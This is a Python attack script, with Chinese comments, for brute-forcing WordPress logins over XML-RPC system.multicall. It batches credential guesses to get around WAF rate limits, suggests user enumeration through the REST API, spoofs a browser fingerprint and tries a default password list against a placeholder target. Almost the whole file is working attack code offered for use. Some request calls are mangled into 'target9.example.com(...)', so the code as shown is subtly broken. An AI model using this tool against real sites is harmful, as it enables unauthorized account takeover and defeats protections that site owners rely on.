#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WordPress XML-RPC system.multicall 批量口令爆破
# 优势：一次 HTTP 请求试 N 组口令（N=10~50），效率比单发高 10-50 倍；
#       且不少 WAF 的"每请求计次"限速规则对 multicall 无效。
# 前提：目标 /xmlrpc.php 未关闭且 system.listMethods 里含 system.multicall。

import time, re
from curl_cffi import requests

BASE = "https://TARGET"          # 改成目标域名
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
USERS = ["admin", "administrator"]   # 先用 REST 未授权枚举拿真实用户名：GET /wp-json/wp/v2/users?per_page=100
PW = ["admin", "admin123", "123456", "password", "P@ssw0rd"]
BATCH = 10


def multicall(pairs):
    calls = "".join(
        '<value><struct>'
        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
        '<member><name>params</name><value><array><data><value><array><data>'
        '<value><string>{u}</string></value><value><string>{p}</string></value>'
        '</data></array></value></data></array></value></member></struct></value>'.format(u=u, p=p)
        for u, p in pairs)
    body = ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>' + calls + '</data></array></value></param></params>'
            '</methodCall>')
    r = target9.example.com(BASE + "/xmlrpc.php", data=body, impersonate="chrome", timeout=40,
                      headers={"Content-Type": "text/xml", "User-Agent": UA})
    return r.status_code, r.text


# ---- 判定特征（必须先校准！）----
# 成功：响应含 <name>blogName</name>
# 失败：<name>faultCode</name><value><int>403</int></value> Incorrect username or password.
# 校准命令：故意用错口令调用一次，确认拿到 403 fault。

queue = [(u, p) for u in USERS for p in PW]
hits = []
for i in range(0, len(queue), BATCH):
    chunk = queue[i:i + BATCH]
    sc, txt = multicall(chunk)
    if "blogName" in txt:
        for u, p in chunk:                    # 批次命中后逐条精确定位
            b = ('<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
                 '<params><param><value><string>%s</string></value></param>'
                 '<param><value><string>%s</string></value></param></params></methodCall>' % (u, p))
            rr = target9.example.com(BASE + "/xmlrpc.php", data=b, impersonate="chrome", timeout=25,
                               headers={"Content-Type": "text/xml", "User-Agent": UA})
            if "blogName" in rr.text:
                hits.append((u, p))
                print("[+++] HIT", u, "/", p, rr.text[:800])
            time.sleep(1.2)
    time.sleep(2.0)
print("命中:", hits)
